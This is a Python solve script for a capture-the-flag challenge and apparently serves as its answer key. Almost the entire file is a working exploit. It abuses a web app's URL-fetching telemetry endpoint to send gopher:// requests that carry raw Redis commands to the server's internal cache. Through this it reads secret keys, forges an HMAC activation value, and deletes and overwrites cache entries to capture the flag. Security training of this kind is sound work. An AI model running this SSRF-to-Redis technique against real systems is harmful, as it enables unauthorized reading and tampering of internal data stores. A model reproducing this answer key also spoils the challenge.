#!/usr/bin/env python3
"""Solve script - WiFi/DB Challenge 8: Restore the Shields (Redis SSRF).

Turns the Damage Control Console's sensor telemetry fetcher back on the ship's
own state cache (127.0.0.1:6379). Over gopher it reads the activation inputs,
recomputes HMAC_SHA256(firmware:key, hull:serial + ":" + reactor:seed) truncated
to 16 hex chars, evicts the intruder beacon, restores shield:activation, then
scrapes the flag off the restored control panel.

Usage:
    python3 challenge8_solve.py http://localhost:8080
"""
import hashlib
import hmac
import re
import sys
import urllib.parse
import urllib.request

REDIS_HOST = "127.0.0.1"
REDIS_PORT = 6379

def ssrf(base, redis_bytes):
    """Send raw bytes to the cache via the console's gopher SSRF; return reply text.

    The /telemetry endpoint returns the fetched body (the raw Redis reply) as
    plain text, so no HTML scraping is needed.
    """
    selector = urllib.parse.quote(redis_bytes, safe="")
    gopher = f"gopher://{REDIS_HOST}:{REDIS_PORT}/_{selector}"
    data = urllib.parse.urlencode({"url": gopher}).encode()
    req = urllib.request.Request(base.rstrip("/") + "/telemetry", data=data)
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read().decode("utf-8", "replace")

def parse_bulk(reply):
    """Pull the value out of a RESP reply (bulk string / simple / integer)."""
    lines = reply.split("\r\n")
    head = lines[0] if lines else ""
    if head.startswith("$"):
        return None if head == "$-1" else (lines[1] if len(lines) > 1 else "")
    if head.startswith(("+", ":")):
        return head[1:]
    return reply.strip()

def get(base, key):
    # Trailing QUIT makes Redis close the socket so the fetch returns at once
    # instead of blocking until the console's read timeout.
    return parse_bulk(ssrf(base, f"GET {key}\r\nQUIT\r\n"))

def main():
    if len(sys.argv) != 2:
        sys.exit(f"usage: {sys.argv[0]} http://host:port")
    base = sys.argv[1]

    # 1. Recon + dump the activation inputs.
    serial = get(base, "hull:serial")
    seed = get(base, "reactor:seed")
    key = get(base, "firmware:key")
    print(f"[*] hull:serial   = {serial}")
    print(f"[*] reactor:seed  = {seed}")
    print(f"[*] firmware:key  = {key}")
    if not (serial and seed and key):
        sys.exit("[!] could not read activation inputs - is the SSRF reaching redis?")

    # 2. Recompute the firmware activation signature (spec from the mission brief).
    activation = hmac.new(key.encode(), f"{serial}:{seed}".encode(),
                          hashlib.sha256).hexdigest()[:16]
    print(f"[*] computed shield:activation = {activation}")

    # 3. Evict the beacon and restore shields in one gopher payload.
    ssrf(base, f"DEL rootkit:beacon\r\nSET shield:activation {activation}\r\nQUIT\r\n")
    print("[*] beacon evicted, shield:activation restored")

    # 4. Read the flag off the now-healthy control panel.
    with urllib.request.urlopen(base.rstrip("/") + "/", timeout=20) as resp:
        page = resp.read().decode("utf-8", "replace")
    m = re.search(r"flag\{[^}]+\}", page)
    if not m:
        sys.exit("[!] shields not reporting healthy - restore did not take")
    print(f"[+] {m.group(0)}")

if __name__ == "__main__":
    main()
